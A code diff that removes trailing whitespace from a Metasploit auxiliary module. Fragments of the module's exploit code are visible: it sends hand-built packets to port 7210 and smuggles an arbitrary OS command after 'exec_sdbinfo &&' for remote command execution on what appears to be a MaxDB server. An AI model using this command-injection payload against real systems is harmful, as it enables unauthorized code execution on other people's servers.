@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'DisclosureDate' => 'Jan 9 2008'))
 
-			register_options( 
+			register_options(
 				[
 					Opt::RPORT(7210),
 					OptString.new('CMD', [ false, 'The OS command to execute', 'hostname']),
@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
 		sock.put(pdbmsrv)
 		sock.get_once
 		sock.put(db_version)
-		
+
 		ver = sock.get_once
 
 		info = ver[27,2000]
@@ -69,10 +69,10 @@ class Metasploit3 < Msf::Auxiliary
 
 		#Send our command.
 		len = 39 + datastore['CMD'].length
-		
+
 		data =  len.chr + "\x00\x00\x00\x03\x3F\x00\x00\x01\x00\x00\x00\x54\x0D\x00\x00"
 		data << "\x00\x00\x04\x00" + len.chr + "\x00\x00\x00\x65\x78\x65\x63\x5F\x73\x64"
-		data << "\x62\x69\x6E\x66\x6F\x20\x26\x26" + "#{datastore['CMD']}" 
+		data << "\x62\x69\x6E\x66\x6F\x20\x26\x26" + "#{datastore['CMD']}"
 
 		sock.put(data)
 
